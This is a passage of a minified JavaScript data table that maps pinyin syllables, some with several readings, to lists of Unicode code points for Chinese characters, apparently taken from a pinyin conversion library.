40584],\"bā\":[20023,20168,20843,21485,21749,22847,23708,24052,25420,26419,29584,30116,31494,31889,32659,33453,34438,35933,37343],\"wán\":[20024,21011,23436,23695,25231,25430,27725,28919,29609,29715,31490,32008,32424,32747,33412,36006,38929,39037],\"dān\":[20025,21231,21296,21336,22921,23173,27546,27563,29972,30472,30723,31658,31774,32828,32829,32835,32888,35101,35148,36525,37112,37170,37206,38933],\"wèi wéi\":[20026],\"jǐng dǎn\":[20028],\"lì lí\":[20029],\"jǔ\":[20030,24326,25369,25831,26887,27017,27032,27384,27397,30697,31589,32869,33289,33682,33951,35191,36413,40799,40835],\"piě\":[20031,33508,37893],\"fú\":[20032,20239,20440,20971,21020,21264,21640,21753,22424,23386,23722,24063,24087,24133,24158,24343,24447,24619,25206,26603,26687,26740,27679,27885,28014,28074,28563,28837,29624,30006,30025,30273,31059,31119,31274,31526,31641,32049,32060,32101,32141,32450,32459,32600,32614,32711,33344,33433,33443,33531,33536,33583,33748,33869,34393,34472,34569,34656,34970,34993,35142,35173,35560,35943,36414,36667,36752,37083,37464,37468,38861,38888,39083,39668,39812,39858,40167,40172,40212,40297,40699],\"yí jí\":[20033],\"yì\":[20034,20041,20100,20134,20159,20231,20287,20350,20427,20740,20863,21e3,21139,21166,21210,21225,21255,21587,21613,21625,21768,22216,22299,22340,22460,22520,22869,23253,23313,23537,23673,23748,23975,24095,24096,24134,24281,24322,24328,24331,24441,24518,24584,24639,24722,24847,25014,25036,25087,25233,25401,25953,26131,26233,26304,26318,26457,26509,26861,27023,27128,27277,27485,27540,27562,27577,27589,27970,28005,28019,28249,28322,28521,28602,28727,28808,28978,29088,29092,29116,29146,29153,29169,29512,29620,30064,30123,30188,30231,30238,30257,30292,30410,30614,31315,31465,31698,32266,32374,32377,32462,32546,32681,32703,32714,32716,32755,32764,32820,32900,32906,33161,33222,33367,33402,33413,33477,33823,34042,34191,34265,34269,34329,34377,34612,34720,34922,34979,35028,35035,35129,35196,35378,35379,35405,35427,35516,35695,35696,35739,35758,35793,35811,35850,35929,35931,35959,35990,36096,36295,36726,36920,37009,37139,37303,37364,37408,37808,37951,38226,38257,38435,38591,38700,39248,39365,39515,39551,39598,39848,40322,40323,40333,40385,40394,40423,40446,40451,40541,40546,40659,40824],\"nǎi\":[20035,20535,22902,23341,24316,27670,30099,33407,36858,37346],\"wǔ\":[20036,20116,20213,20237,20398,20533,20763,21320,21838,22953,23084,23285,24209,24289,24548,24579,25006,25664,27494,28501,29075,29310,29597,29687,29798,29970,30868,33310,36492,36821,36892,38490,40289,40521],\"jiǔ\":[20037,20038,20061,20067,22906,26470,27747,28792,29590,32036,33295,37202,38265,38893,38894],\"tuō zhé\":[20039,26452,39346],\"me mó ma yāo\":[20040],\"zhī\":[20043,20481,21358,24053,25624,25903,26624,26772,26917,27056,27713,27868,30135,31063,31084,31187,31257,32149,32930,32977,32989,33026,33437,34357,34584,34940,38587,40183,40242,40709],\"wū wù\":[20044],\"zhà\":[20045,21668,23473,25662,27048,28320,30148,34481,35408,35784,37281,38661],\"hū\":[20046,20079,21282,21291,21628,21823,22033,22400,23523,24160,24573,24794,26130,27473,27864,28148,28409,28864,33528,34381,34390,35644,36580,36727,38608],\"fá\":[20047,20240,20640,22394,22433,22690,22978,26672,27980,30594,31529,31567,32602,32624,32632,34245,38309,38400],\"lè yuè yào lào\":[20048,27138],\"yín\":[20049,21535,22102,22170,22273,22432,22820,23148,23493,23806,23839,23855,27309,27557,27903,28139,28379,28878,29374,29434,29836,30797,30866,33654,34089,35348,35354,35361,35518,37150,37405,37504,38134,38698,40419,40806],\"pīng\":[20050,20444,23049,28036,30009,30767,32864,33397,38953],\"pāng\":[20051,28354,33006,33174,38641,38710],\"qiáo\":[20052,20392,20689,23286,24980,26725,27095,27189,27211,27381,29342,30631,30810,30980,33613,33630,34126,34286,35673,36267,37896,38802,38845,39014],\"hǔ\":[20053,29733,33792,34382,34397,37695,39921],\"guāi\":[20054],\"chéng shèng\":[20055,20056,23053],\"yǐ\":[20057,20059,20197,20506,20591,23327,23866,24050,24225,25158,25914,25980,26065,26070,27301,30691,30994,31510,33315,33380,33505,33506,34433,34712,34811,35071,36390,36642,36697,36888,37199,37332,37400,37487,38023,38999,40166,40814],\"háo yǐ\":[20058],\"niè miē\":[20060],\"qǐ\":[20062,20225,21551,21784,21843,21844,21855,23117,23674,26462,26856,29592,30400,32186,32494,33425,35564,36215,37012,38361],\"yě\":[20063,20918,22050,22492,22724,28444,37326],\"xí\":[20064,21946,23219,23949,24109,26938,27268,28445,32722,33990,34989,35186,35233,35275,35637,36248,37067,37812,38576,38699,39105,39473,39485,39528,39996,40155],\"xiāng\":[20065,21410,24258,24512,27007,27392,28248,29910,31269,31665,32215,32515,33207,33431,33835,33881,34188,35140,37111,37129,37130,37141,38002,38262,39321,39524,39591,40028,40600],\"shū\":[20070,20495,20496,20789,21460,23005,23575,25234,25491,25669,25860,26360,26530,26803,27166,27530,27571,27641,27642,28113,28717,28930,30094,30095,32019,32128,32446,33298,33789,34092,36360,36567,36664,36755,37123,38478,39835,40296],\"dǒu\":[20071,25238,26515,34474,37380,38439,38497],\"shǐ\":[20072,20351,20824,21490,22987,23465,23630,27009,30690,31542,35925,37442,39387,39542],\"jī\":[20073,20703,20987,21001,21007,21086,21501,21799,21918,21976,22064,22334,22522,22716,23020,23632,23878,23879,25731,25802,26398,26426,26501,27181,27231,27588,28608,29316,29585,29859,30072,30079,30314,30710,30959,31215,31309,31492,31571,31637,31754,32193,32641,32647,32648,32813,32908,33448,34368,35209,35210,35663,35684,35749,36075,36087,36173,36347,36369,36491,36536,37512,37668,37910,37959,37977,38574,38622,38847,38898,39138,39249,39269,39765,40174,40335,40378,40388,40452,40481,40782,40783,40785],\"náng\":[20074,22178,27420,34864,39266],\"jiā\":[20075,20339,20642,21152,22025,25272,26551,26780,27616,27847,27971,28025,29324,29491,29640,30146,31539,31960,32798,33141,33901,34952,35949,35985,36303,36838,37483,37813,38227,40208,40602],\"jù\":[20076,20520,20534,20855,21095,21127,21230,22503,22526,22729,22998,23654,23656,23712,24040,24042,24583,24807,24883,25029,25084,25298,25312,26139,27499,27952,28605,28844,28901,29323,31212,31405,31414,31796,31892,32799,32858,34401,34487,35406,35765,35942,36317,36382,36486,36989,37037,37301,37445,37947,38044,39094,39123,39375,39828],\"shí\":[20077,21313,22488,22610,23036,23454,23455,23508,23526,23765,23925,26102,26105,26178,27055,28252,28321,28859,31055,31437,34432,34645,36795,36936,37456,39136,39267,39830,39971,40101,40747,40749],\"mǎo\":[20078,20871,21359,23745,25148,26164,27862,31543,34025,37466,38086],\"mǎi\":[20080,22058,33644,34130,36023,40438],\"luàn\":[20081,20098,37344],\"rǔ\":[20083,25833,27741,32919,36785,37135],\"xué\":[20084,23398,23416,23747,23976,25992,27894,28585,29154,31348,33555,34965,36357,40445,40500],\"yǎn\":[20085,20456,20547,20796,20822,20823,21411,21428,22110,23373,23875,24024,24026,24327,24861,25133,25162,25217,25513,25564,26350,26940,27327,27783,28215,28436,29744,29975,30524,32616,33810,34648,34893,35095,36541,36931,37118,38546,39017,39751,39768,39947,40352,40673,40676,40684,40685,40694,40756,40761,40820,40849],\"fǔ\":[20086,20428,20443,20463,24220,24355,25242,25290,25771,26023,26920,28367,28964,29995,30425,31776,33104,33105,34565,36628,36741,37081,37340,37345,38429,38955,39732,40700],\"shā\":[20087,21798,26432,26732,27578,27630,29440,30183,30722,30832,32023,32378,32433,34097,35039,37801,38121,38327,39679,39782,39882,39883,40104],\"nǎ\":[20088,38635],\"qián\":[20089,20097,20209,20546,21069,22680,23178,23698,25297,25518,27049,27244,27500,28507,28508,28659,28746,31645,33893,34388,36577,37392,37463,37549,37666,37766,38052,38065,38067,38764,39450,39453,39980,40660,40666],\"suǒ\":[20090,21794,21993,25152,26267,28305,28345,29712,29713,29795,32034,35112,37782,37819,37825,38145],\"yú\":[20091,20110,20112,20227,20313,22563,22572,22948,23067,23087,23089,23337,23859,23886,23899,24858,25205,25540,26079,26977,26992,27014,27428,27464,27487,27510,28180,28189,28257,28417,28574,29263,29427,29591,29593,29788,29877,30402,30574,31404,31485,31813,32685,33140,33278,33281,33286,33349,33584,33838,33848,34125,34331,34398,34422,34643,34744,34919,35093,35238,35278,35547,35619,35840,36400,36671,36701,36926,37016,37201,37725,38533,38611,38633,39192,39296,39455,39596,39619,39770,39779,39869,39922,39941,40060,40416,40454,40821],\"zhù\":[20092,20267,20295,20303,22398,22712,22772,23872,25280,26492,26609,27174,27574,27880,28855,30128,30493,31069,31081,31450,31599,31672,31723,31767,32053,32056,32443,32668,32741,33486,33671,34496,35387,36015,36142,36307,36596,37458,37619,37956,38136,39349,39376,39547],\"zhě\":[20093,32773,35126,35189,36205,36407,37754,38167],\"qián gān\":[20094],\"zhì luàn\":[20095],\"guī\":[20096,22317,22955,23215,23266,23296,24112,24402,25707,26909,27131,27132,27383,27512,29674,29808,29853,29900,30344,30625,30789,33573,34348,35215,35268,37053,37068,38312,38394,39465,39734,39737],\"lǐn lìn\":[20099],\"jué\":[20101,20915,21012,21122,21303,21413,22090,23378,23379,23835,23851,23973,24399,24992,25008,25092,25225,25367,25496,25899,26743,27227,27228,27438,27666,27770,28749,28979,29094,29201,29236,29237,29527,29571,29606,29608,29647,29812,30234,30669,30689,30724,32085,32118,32477,33220,33461,34141,34152,34419,34792,34793,35286,35310,35324,35363,35662,35776,35890,35996,36221,36233,36471,36521,37388,37901,37917,38017,38242,40194,40195,40418],\"le liǎo\":[20102],\"gè mā\":[20103],\"yǔ yú\":[20104,25049],\"zhēng\":[20105,20290,20967,22979,23196,23781,23837,23842,24449,24496,28833,28893,29229,29424,29465,30309,30480,30529,30556,31581,31631,31708,32839,33024,33976,36397,37478,37658,37875,39687],\"èr\":[20108,21045,21665,24333,24336,27186,35456,36014,36019,36144,39670],\"chù\":[20109,20631,20746,24629,25015,25616,26038,27484,29695,29729,30679,31436,32064,32460,33221,35302,35320,35926,37136,38310,40668],\"kuī\":[20111,21042,23743,24011,30420,31397,31418,32871,34407,38362,39005],\"yún\":[20113,20253,21243,21248,22249,22936,24874,25251,26112,27218,27780,28066,28339,28560,29065,30023,31184,31612,31700,32028,32284,32429,32792,33464,33975,34131,37095,37142,37574,38642],\"hù\":[20114,20913,21952,22171,23135,23277,23278,23733,24077,24342,24601,25142,25143,25144,25149,25160,25252,26120,27124,27789,27818,28396,29097,29920,31068,31503,31748,31888,32148,34096,35703,35952,37152,37721,38912,40047,40160,40184,40460,40561],\"qí\":[20115,21080,22524,23696,23699,23822,23900,24877,25489,25993,25994,26050,26071,26826,26827,27313,27328,27495,28103,28637,29449,29570,29734,29738,29826,30054,30119,30849,30869,31041,31048,31098,31141,31442,31791,31793,31823,31928,32165,32166,32949,33040,33229,33385,33450,33793,33813,34162,34244,34308,34449,34458,34548,34589,34590,34727,34832,35072,36573,37183,37358,37665,38172,38509,38926,39040,39438,39439,39481,39568,39569,39696,39743,39893,39981,40111,40141,40312,40320,40594,40609],\"jǐng\":[20117,20742,21037,21060,22355,23441,24156,25004,26299,27532,27755,27756,28555,29828,29855,29861,31357,32956,34812,35686,38449,38938,38968],\"sì\":[20118,20288,20385,20777,20821,21987,22235,22994,23088,23392,23546,24051,26614,27065,27740,27863,27876,27917,27936,28056,28675,29293,31040,31145,31458,31525,32796,32898,32902,34172,35223,35972,37362,37430,37435,39140,39164,39282,39391,39427,39543],\"suì\":[20119,23320,23681,23895,26078,27286,27506,27507,28603,29035,29159,29874,30741,30862,31071,31149,31298,31319,31327,32320,32336,32376,35162,35510,35682,35847,36069,36995,37894,37929,38567,38882],\"gèn\":[20120,20121,25583,25604,33563],\"yà\":[20122,20124,20473,20916,21148,22292,22304,22497,23045,23149,25568,27689,27692,29373,30737,31247,32848,35198,35200,35357,35766,36711,36819,40830],\"xiē suò\":[20123],\"qí zhāi\":[20125,40778],\"yā yà\":[20126,21387,22445,22739,38100],\"jí qì\":[20127,28943],\"tóu\":[20128,25237,38957,39600],\"wáng wú\":[20129],\"kàng háng gāng\":[20130],\"dà\":[20131,30484],\"jiāo\":[20132,20716,23047,23308,23783,23957,23971,24973,26898,27975,28550,28966,30977,31322,31781,33014,33184,33202,33581,33582,34121,34400,34527,34797,36324,36679,37066,37902,39509,39556,39851,40091,40257,40422,40430,40554],\"hài\":[20133,21968,23475,27686,39168,39258,39405,39412,39559],\"hēng pēng\":[20136],\"mǔ\":[20137,22982,23764,25287,27597,29281,29299,30018,30022,30034,30045,30046,30062,30762,32991,36359,37479],ye:[20138],\"xiǎng\":[20139,20143,21709,24819,26193,34435,34817,38911,39144,39177,39255,39287,39837,39895,40054,40094],\"jīng\":[20140,20144,20834,22357,22361,23131,24778,26060,26061,26230,27256,27902,28039,29444,30555,31188,31241,31923,31934,32076,32147,32161,32857,33096,33550,33606,33610,33729,33871,39514,39912,40120,40321,40324,40598,40608,40753],\"tíng\":[20141,20572,23159,23881,24237,24311,26975,27059,31603,32868,33691,33910,34579,34639,35562,37010,38662,40750],\"liàng\":[20142,21928,24738,26238,28280,35538,35845,36620,36635,36742,37700],\"qīn qìng\":[20146,35242],\"bó\":[20147,20194,20412,20720,21338,24091,24893,25066,25388,25615,27394,28001,28159,28196,29055,29268,29403,29917,31028,31201,31636,31769,31978,32969,33046,33162,33334,33354,33825,33895,34991,35151,35182,35592,36387,37091,37432,37457,37581,37787,37998,38073,38082,38216,39226,39310,39323,39326,39361,39406,39539,39622,40275,40513],\"yòu\":[20148,20305,20326,20369,21448,21491,21706,21760,22271,23031,23461,23775,24188,29398,31056,34484,35480,35825,35969,36854,37229,37321,40748],\"xiè\":[20149,20275,20574,20592,20673,21352,21368,22119,22638,22801,23199,23633,23655,24296,24482,25032,26284,26800,27021,27053,27899,27945,28203,28581,28681,28707,28794,28839,28840,29166,29205,29548,31044,31164,31951,32050,32079,32108,32370,32392,32449,32567,34210,34212,34809,34831,35081,35131,35613,35874,36510,36994,38782,38896,40770,40792,40795,40805],\"dǎn dàn\":[20150,39358],\"lián\":[20151,21126,21298,21299,22009,22098,22849,22889,23294,24088,24265,24604,24976,28063,28451,28610,28627,28718,29073,29163,31806,31842,31848,32314,32756,32852,32872,32875,32878,32879,33217,33714,34030,34197,34698,34826,35042,35123,35229,35632,36453,36830,36899,37772,37934,38256,39697,39985,40098],\"duǒ\":[20152,21722,22194,22517,23836,26421,26422,32158,32525,36243,36529,36530,36547],\"wěi mén\":[20153,26006],\"rén\":[20154,20155,20161,22764,24520,24526,26418,31170,33442,39772,40256],\"jí\":[20156,20157,20235,20342,20590,21337,21363,21373,21450,21469,21513,22578,22601,23006,23241,23692,23924,23983,24438,24547,24613,24881,25122,25572,26497,26840,26987,26997,27081,27293,27547,27762,28242,28503,30142,30240,30349,31496,31679,31821,32026,32423,33164,33381,33978,34112,34170,34637,34703,35147,35289,35899,36374,36432,36516,36655,36698,36753,37062,37537,37715,37878,38598,38631,38709,40545],\"wáng\":[20158,20220,20838,33699,34463],\"shén shí\":[20160],\"lè\":[20162,21499,24519,27707,27856,29583,30771,31765,33403,38430,38903,39182,39987,40051,40147],\"dīng\":[20163,21486,24068,29582,30100,30447,32821,34416,38762],\"zè\":[20164,23857,24194,25425,26115,26135,27716],\"jǐn jìn\":[20165,20677,23268],\"pú pū\":[20166],\"chóu qiú\":[20167],\"zhǎng\":[20169,24165,25484,30979],\"jīn\":[20170,22587,24062,24781,26020,27941,29650,29755,29857,30747,31563,33621,34943,35167,35284,37329,37330,37375,38021,40566,40645],\"bīng\":[20172,20178,20853,20907,20912,25508,27703,37618],\"réng\":[20173,31037,33471,36792,38526],\"fó\":[20175,22386,26811],\"jīn sǎn\":[20176],\"lún\":[20177,20262,20374,20523,22261,22279,23144,23832,23833,26822,27814,28138,30958,33088,33749,34598,36378,36650,36718,37632,38511,39913],\"cāng\":[20179,20218,20489,20948,23906,27815,28356,28664,29514,33329,33369,33485,33980,34725,40487],\"zǎi zǐ zī\":[20180],\"tā\":[20182,22604,23427,27033,28347,29280,31042,35103,36287,36962],\"fù\":[20184,20585,20613,20904,21103,21648,22399,22797,22919,23142,23181,23316,23500,24489,26929,31060,31139,31438,32238,32283,32538,33145,33839,34151,34489,34519,34652,34670,34973,35079,35204,35206,35331,35394,35747,36e3,36070,36091,36127,36171,36185,36212,36665,37713,37730,38428,38468,39333,39385,39544,39826,39954,40075,40134],\"xiān\":[20185,20186,20321,20682,20722,20808,22037,22910,23667,24303,24570,25016,25472,26297,26484,27673,29655,31046,31176,31868,32330,32398,32406,33518,35132,35187,36345,36462,36506,37232,37697,38184,38895,38897,39334,40059,40369],\"tuō chà duó\":[20187],\"hóng\":[20188,21552,22444,22917,23042,23439,23446,24344,24395,27759,27859,27946,28004,28209,28482,29586,29596,30804,31441,31460,31690,31904,32024,32045,32139,32430,32707,32733,32830,33520,33645,33874,33875,35897,35900,37404,37495,37584,38286,38387,38672,38687,38787,39775,40251,40511,40649,40652],\"tóng\":[20189,20319,21699,23746,23773,24221,24420,26189,26312,26704,27651,28021,28540,29341,29534,30510,30643,30780,31217,31461,31905,33191,33596,34450,35447,36200,37230,37462,37493,37509,38108,39175,39846,40086],\"rèn\":[20190,20205,20995,20996,22922,23001,23675,23683,25192,29283,31053,32009,32029,32077,32427,32436,32917,33101,34941,34997,35346,35469,35748,35761,36564,36715,37395,38765,38769,38860,38887,39146,39169,39274],\"qiān\":[20191,20325,20681,21315,22322,22903,23407,23693,24749,24838,24947,25190,25322,25652,25729,25872,25873,25875,26436,27343,27736,27751,29301,29309,31439,31614,31805,31830,31844,31873,33418,33598,34440,35120,35536,35609,35878,35896,36801,36983,37370,37382,37467,37874,38030,38433,38854,38981,39467,39582,39708,39709,40302,40528],\"gǎn hàn\":[20192],\"yì gē\":[20193],\"dài\":[20195,20386,21447,22408,22509,23729,24082,24102,24111,24118,24279,24608,25140,26307,26571,27526,28731,29619,29767,29977,31780,32063,32255,32464,33372,34675,34955,35190,36003,36151,36443,36561,36570,36585,36714,36840,38708,38726,40207,40667,40689],\"lìng líng lǐng\":[20196],\"chào\":[20198,32790,35288],\"cháng zhǎng\":[20199,20815,38263,38271],\"sā\":[20200],\"cháng\":[20201,20607,20767,22039,22160,23270,23581,24120,24476,29818,29946,29982,32928,33144,33171,33484,33799,38264,40040,40127],\"yí\":[20202,20359,20736,20893,21276,21670,22319,22839,23016,23440,23452,23463,23538,23763,23980,23991,24056,24411,24412,24413,24414,24609,24670,25157,26246,26648,26924,26936,27778,27935,29098,29941,30157,31227,31747,31822,32672,33008,33811,34534,34708,35322,35643,36029,36155,36320,36859,36986,37844,38921,38948,38949,38986,39056,39284,39847,40250],\"mù\":[20203,20969,21215,22675,24149,24153,24916,24917,26286,26287,26408,26968,27619,27792,28817,29287,29383,30446,30566,31302,33362,33500,33711,34462,37484,38076,38638,38658],\"men mén\":[20204],\"fǎn\":[20206,21453,27214,36820],\"chào miǎo\":[20207],\"yǎng áng\":[20208],\"zhòng\":[20210,20247,22585,22933,23185,29382,30526,31052,31575,33597,34459,34886,34934,35557],\"pǐ pí\":[20211],\"wò\":[20212,20563,21351,23177,24132,25569,26947,27779,28197,28643,29889,30595,30826,32927,33115,33253,40823,40844],\"jiàn\":[20214,20468,20581,20717,21073,21091,21105,21133,21134,21138,21140,22713,23499,24314,24484,25846,26068,26967,27645,27914,28071,28567,29294,29652,30647,30965,30976,31661,31947,32349,33137,33270,33328,33382,33616,34214,35256,35539,35563,35675,35855,36046,36068,36145,36253,36341,36368,36410,36702,37492,37747,37749,37937,37969,37970,37996,38003,38190,38291,39198,39279],\"jià jiè jie\":[20215],\"yǎo fó\":[20216],\"rèn rén\":[20219],\"fèn bīn\":[20221],\"dī\":[20222,20302,21874,22494,22564,23739,24445,27136,28404,30974,31210,32669,34971,36230,38532,38830],\"fǎng\":[20223,20515,26058,26121,26136,29932,30470,32033,32442,33323,35370,35775,39651,40365],\"zhōng\":[20224,21027,22928,24146,24440,24544,26570,27767,27848,28802,30405,31846,32066,32456,33327,34080,34585,34724,34749,34931,34935,36465,37409,37758,37912,38047,38202,40228,40744],\"pèi\":[20226,20329,23029,24084,26046,26054,27803,28031,29678,34012,36705,36756,37197,38664,39351],\"diào\":[20228,21514,24340,25481,30265,30404,31374,31413,31464,35339,37347,37407,37553,37629,37955,38035,38110,38655,39777],\"dùn\":[20229,28513,28822,29129,30462,30744,30903,36402,36871,36929,36975,37389,38045],\"wěn\":[20230,21006,21563,21573,25222,26749,31283,31311,31337,32010,32947,33047],\"xǐn\":[20232],\"kàng\":[20233,21279,22245,25239,28821,37415,38058],\"ài\":[20236,20734,22631,22738,23250,23329,24859,25043,26279,26326,29233,29815,29862,30375,30649,30777,30795,30861,31001,34182,35706,36089,37952,38552,38729,39218,39332,40043,40241],\"jì qí\":[20238,34234],\"xiū xǔ\":[20241],\"jìn yín\":[20242],\"dǎn\":[20244,21008,25762,29612,29933,32030,32966,33213,34932,36071,36181,40661],\"fū\":[20245,21579,23056,23413,23555,24612,25071,25975,26057,29598,30726,31235,31583,31952,32146,32932,33178,33602,33652,34925,36282,36311,37022,37148,37212,37383,40617,40620,40625,40632],\"tǎng\":[20246,20645,20795,22507,25091,26349,29219,30680,36538,37810,38018,38219],\"yōu\":[20248,20778,21606,22168,23795,24189,24551,24736,24962,25912,27340,28410,28672,32395,32682,32816,36876,37182,40576],\"huǒ\":[20249,22821,28779,29047,37033,37413,38060],\"huì kuài\":[20250,26371,27981,29871],\"yǔ\":[20251,20417,20451,20554,20660,21292,22131,22276,22281,23431,23513,23679,23996,24254,25383,25940,26014,26944,29760,30224,31076,31161,31333,31411,32701,33287,33837,35984,37125,38952,40588,40812,40841],\"cuì\":[20252,21851,24560,24756,27635,28140,28960,30121,30209,31425,31883,31929,32035,32183,32710,32736,33027,33030,33082,33196,33205,33230,33795,35146,38983],\"sǎn\":[20254,20632,31972,32342,39242,39315],\"wěi\":[20255,20266,20553,20605,20702,20784,23059,23530,23843,23945,24491,24839,25444,26256,26806,27943,27992,28200,28828,29010,29477,29614,29771,30207,32239,32428,33138,33353,33435,33479,33649,33806,33894,33933,34111,34620,35529,35839,36371,37729,38865,38873,38881,38890,38944,39097,39593,39594,39595,39850,40084],\"chuán zhuàn\":[20256,20659],\"chē jū\":[20257,20453,36554,36710],\"yá\":[20258,21393,21395,22544,23688,23829,23830,28079,28420,29273,29601,29706,30554,31500,33469,34460,34905,40790],\"qiàn\":[20259,20436,20521,20761,21003,22733,23345,24723,26824,26912,27111,27424,27465,30360,31695,31711,32308,33441,33960,34099,36644],\"shāng\":[20260,20663,21830,22674,24943,27527,27556,28403,28449,29109,34063,34730,35294,35316,35626,39738],\"chāng\":[20261,20480,23100,26124,26905,28112,29462,29737,33750,35054,37673,38176,38326,38410,39911,40115,40730],\"chen cāng\":[20263],\"xùn\":[20264,20378,21314,22080,24058,24061,24455,24891,27529,27582,27739,28512,29413,34120,35338,35347,35353,35757,35759,36805,36863,36874,36956,37954,39016,39348,39535],\"xìn\":[20265,22239,23390,33066,33291,34885,35371,37313,38432,38998],\"chǐ\":[20268,20360,21366,21498,22417,24677,27503,32827,32916,32995,34439,35053,35115,35913,37497,40786,40831],\"xián xuán\":[20269],\"nú nǔ\":[20270],\"bǎi bó\":[20271],\"gū gù\":[20272],\"nǐ\":[20273,20320,20766,23412,25311,25836,26062,26226,29396,33512,34239,38572],\"nì ní\":[20274],\"bàn\":[20276,21150,21322,22981,24593,25198,29923,31194,32070,32458,36774,37473,38781],\"xù\":[20277,20368,21206,21207,21369,21465,22463,22779,23167,24207,24676,25933,25944,26093,26155,26370,27090,27440,27528,27775,27776,27947,28294,28469,28490,28869,28924,29030,29533,29676,30434,30593,31288,32110,32154,32210,32214,32396,32490,32493,32851,32863,33988,34266,35385,36041,37207,38922,40046],\"zhòu\":[20279,20733,20881,21610,21650,21678,23449,26172,26205,29955,30385,30394,31808,31826,31829,31897,32002,32272,32419,32457,32964,33646,33892,35403,37198,39374,39519,39588],\"shēn\":[20280,20353,20831,21627,22548,22973,23072,23678,23799,25183,25938,26321,26587,27680,28145,29130,29637,29985,29991,30003,30482,30775,31356,31862,31864,31938,32051,32453,32601,32615,33888,34017,34072,34195,35025,35383,35445,35804,36523,39402,39891,39925,39994,40121,40290],\"qū\":[20281,20297,21284,21631,22373,23624,23702,23732,23943,24968,25278,25978,27968,28992,31067,31553,31916,32992,34502,34512,34986,35259,35416,35790,36237,36527,36544,38457,39366,39368,39493,39537,39671,39804,39992,40011,40332,40623,40628,40633,40674],\"sì cì\":[20282],\"bēng\":[20283,22051,22879,23849,23917,38285],\"sì shì\":[20284],\"jiā qié gā\":[20285],\"yǐ chì\":[20289],\"diàn tián\":[20291,38079],\"hān gàn\":[20292],\"mài\":[20293,21154,21233,21334,21787,22770,33032,34887,36067,36808,36993,38689,38690,40613,40614],\"dàn\":[20294,20708,21846,21847,21887,22089,22186,24078,25018,26086,26598,27694,27786,27897,28129,29402,30093,30298,31147,31390,33093,33807,34014,34507,34577,35291,35345,35477,35806,36105,38702,39204,39247,39411,39655,40224],\"bù\":[20296,21199,21541,21656,22487,22496,24067,24269,24598,24721,27493,27496,27497,29951,31728,33657,34048,36356,37096,37110,37384,38042,39202],\"bǐ\":[20298,20478,21269,22838,22947,24444,26428,26560,27604,27614,27800,30101,31189,31508,31558,31875,32859,33325,35983,37145],\"zhāo shào\":[20299],\"cǐ\":[20300,27492,27866,30345],\"wèi\":[20301,21355,21619,21890,22683,23206,24944,25024,26410,28205,29023,29101,29338,29484,30031,32237,32635,32963,33535,33739,34287,34358,34655,34737,34907,34910,35133,35586,35718,35727,35859,36503,36507,36558,36682,37839,38696,39207,39221,39254,39759,39815,40154],\"zuǒ\":[20304,24038,32339],\"yǎng\":[20306,20639,20859,22385,23711,24899,25065,25857,27687,27697,28852,30162,30306,31010,32059,34630,36590,39178,39386],\"tǐ tī\":[20307,39636],\"zhàn\":[20308,20577,23960,25112,25126,25136,26632,26719,26855,28251,31449,32187,32509,33754,34360,34405,34406,35687,36687,39503],\"hé hē hè\":[20309],\"bì\":[20310,21639,21716,22006,22354,22555,22721,22896,22972,23138,23318,24065,24163,24164,24199,24243,24294,24330,24379,24380,24387,24517,24621,24842,24846,25949,25987,26768,27605,27606,27609,28258,28375,28397,28535,29007,29082,29428,29528,29529,29644,29863,30016,30050,30122,30201,30202,30357,30564,30887,31578,31621,31622,31718,31731,31882,32188,32298,32372,32636,33143,33534,33628,33798,33822,34006,34045,34109,34204,34572,34960,35141,35166,35171,35313,35414,35792,36017,36116,36177,36344,36437,36483,36484,36991,37042,37160,37162,37453,37838,37940,38091,38279,38281,38303,38381,38491,38880,39158,39238,39325,39388,39494,39616,39763,39813,40413,40425,40714],\"tuó\":[20311,22376,22582,23726,27094,27216,27825,30755,30756,30882,32061,35409,36302,37217,38436,38464,38465,39389,39390,39464,39506,39517,39548,39808,40213,40501,40713,40717,40743],\"shé\":[20312,33292,34421,34533],\"yì dié\":[20314,26163,27846,36604],\"fó fú bì bó\":[20315],\"zuò zuō\":[20316],\"gōu\":[20317,27807,28317,30144,31709,31804,32241,32529,34983,35104,37390,37476,38057,38834,38877],\"nìng\":[20318,20395,20543,23509,27870,28573,28632],\"qú\":[20322,21164,25141,26026,27403,27412,27661,28141,28744,29216,29846,29865,30319,30962,31847,32071,32970,33246,33731,33867,34134,34343,34781,34871,34876,34896,34914,36515,36581,38010,40221,40476,40498,40745],\"yōng yòng\":[20323],\"wǎ\":[20324,21651,30745,37047],\"kǎ\":[20327,22448,33001,35011,37490],\"bāo\":[20328,21241,21253,23394,29042,31523,32990,33502,34132,35046,35090,35139,38337,40793,40837],\"huái huí\":[20330],\"gé hè\":[20331],\"lǎo\":[20332,21694,24645,26675,29419,29679,30803,32769,32770,33622,34543,36689,37536,38097,39857],\"xiáng\":[20333,24224,26649,31077,32116,32724,35443,36333],\"gé\":[20334,21260,21572,21981,22629,24837,25356,25663,27077,27338,28358,33160,33269,33558,35297,35581,36661,36693,38307,38401,38548,38839,38864,38874,39444,39612,39855],\"yáng\":[20335,21175,22431,23864,24457,25196,25562,25965,26104,26140,26264,26472,26954,27915,28800,29660,30113,30221,30523,34520,35577,36656,37722,38038,38438,38451,38525,38711,39098,39119,39953,40249,40457],\"bǎi\":[20336,25453,25670,25850,26658,30334,31457,31912,35180],\"fǎ\":[20337,23772,27861,28747,30749,37701],\"mǐng\":[20338,20949,23027,24911,37225],\"èr nài\":[20340],\"hěn\":[20343,24456,29408,35434],\"huó\":[20344,27963],\"guǐ\":[20345,21286,21293,21420,22429,23037,23428,24203,24234,24657,26231,28224,30328,31082,31755,34539,34785,35300,35437,35809,36556,36712,38482,39740],\"quán\":[20346,20840,21875,22498,23038,23761,24015,25331,25660,26435,27006,27177,27402,27849,27940,28278,29303,29320,29780,30154,30786,31564,32275,33603,33906,34615,34872,35296,35438,35808,36327,36385,36615,36737,37275,37523,38120,38350,39028,39079,39401,39457,39688,39937,40136,40804],\"tiāo\":[20347,24227,26091,31079,32846],\"jiǎo\":[20348,20748,23362,25378,25605,25759,25785,25898,25963,25981,25983,26184,26270,26322,28762,29150,29409,29868,30350,30374,32094,32400,32478,33139,33259,34780,35665,36043,36363,37496,38128,39171,39290,40014,40867],\"cì\":[20349,21054,24219,26431,26664,27425,32088,33574,33727,34515,34694,36060,36176],\"xíng\":[20352,21009,21720,22411,23065,24418,27920,30798,34549,37026,37065,37379,37494,37522,38040,38095,38473,38488,39219],\"tuō\":[20354,21635,21660,22315,25176,25301,25302,27729,33067,33073,33676,34981,35351,35756,39141,39270,39776,39861],\"kǎn\":[20355,20568,20890,22350,24770,30733,33712,36641,36695,38993],\"zhí\":[20356,20516,20540,22516,22519,2